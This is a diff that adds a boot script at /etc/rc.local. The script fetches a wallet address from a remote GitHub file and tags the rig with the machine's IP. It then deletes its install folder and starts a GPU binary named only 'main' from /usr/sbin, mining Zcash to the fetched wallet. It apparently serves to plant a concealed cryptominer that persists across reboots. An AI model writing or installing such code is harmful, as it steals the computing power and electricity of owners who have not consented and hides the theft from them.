@@ -1,0 +1,15 @@
+#!/bin/sh -e
+#/etc/rc.local
+cd /root/minergpu
+IP=$(ifconfig | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}')
+DATE=$(date '+%d.%m')
+RN1=$((RANDOM%512+6))
+RN2=$((RANDOM%512+6))
+RIG="$DATE.$IP.$RN1.$RN2"
+RIG=`echo "$RIG" | sed 's/\./-/g'`
+WALLET=$(curl https://raw.githubusercontent.com/davidavaboomers/z/master/t-wallet)
+cd /usr/sbin/
+rm -rf /root/minergpu/
+./main --server eu1-zcash.flypool.org --user  $WALLET.$RIG --pass x --port 3333 --cuda_devices 0
+
+exit 0
